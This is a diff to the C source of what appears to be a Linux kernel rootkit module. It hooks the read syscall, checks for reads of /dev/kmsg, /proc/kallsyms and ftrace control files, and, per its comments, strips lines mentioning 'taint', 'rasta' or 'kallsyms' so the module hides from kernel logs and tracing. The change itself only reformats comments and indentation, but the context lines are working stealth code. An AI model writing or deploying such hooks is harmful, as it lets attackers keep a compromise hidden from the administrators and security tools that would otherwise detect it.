@@ -25,21 +25,21 @@ static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
     file = fget(fd); // Gets the file object corresponding to the fd
     if (file) {
 	    
-        // Check if the file is:
-	// 	- /dev/kmsg 
-	// 	- /proc/kallsyms or
-	// 	- /sys/kernel/tracing/enabled_functions
-	// 	- /sys/kernel/tracing/touched_functions
-	// 	- /sys/kernel/tracing/tracing_on
-	// 	- /proc/sys/kernel/ftrace_enabled
+      /* Check if the file is:
+	       	- /dev/kmsg 
+	        - /proc/kallsyms
+      	 	- /sys/kernel/tracing/enabled_functions
+      	 	- /sys/kernel/tracing/touched_functions
+      	 	- /sys/kernel/tracing/tracing_on
+      	 	- /proc/sys/kernel/ftrace_enabled */
 	
 	
         if (strcmp(file->f_path.dentry->d_name.name, "kmsg") == 0 ||
             strcmp(file->f_path.dentry->d_name.name, "kallsyms") == 0 ||
             strcmp(file->f_path.dentry->d_name.name, "touched_functions") == 0 ||
-	    strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
-	    strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0 ||
-	    strcmp(file->f_path.dentry->d_name.name, "enabled_functions") == 0) {
+	          strcmp(file->f_path.dentry->d_name.name, "ftrace_enabled") == 0 ||
+	          strcmp(file->f_path.dentry->d_name.name, "tracing_on") == 0 ||
+	          strcmp(file->f_path.dentry->d_name.name, "enabled_functions") == 0) {
             
             fput(file); // Frees the file object after verification
 
@@ -87,7 +87,7 @@ static notrace asmlinkage ssize_t hooked_read(const struct pt_regs *regs) {
                 *line_ptr = '\0';  // Temporarily terminate the line
 
             /*
-                So check it out, this is where the magic happens with hiding from those three tracing files. 
+                So check it out, this is where the magic happens with hiding from those tracing files. 
             */
 
                 // Check if the line contains "taint", "rasta", or "kallsyms" 
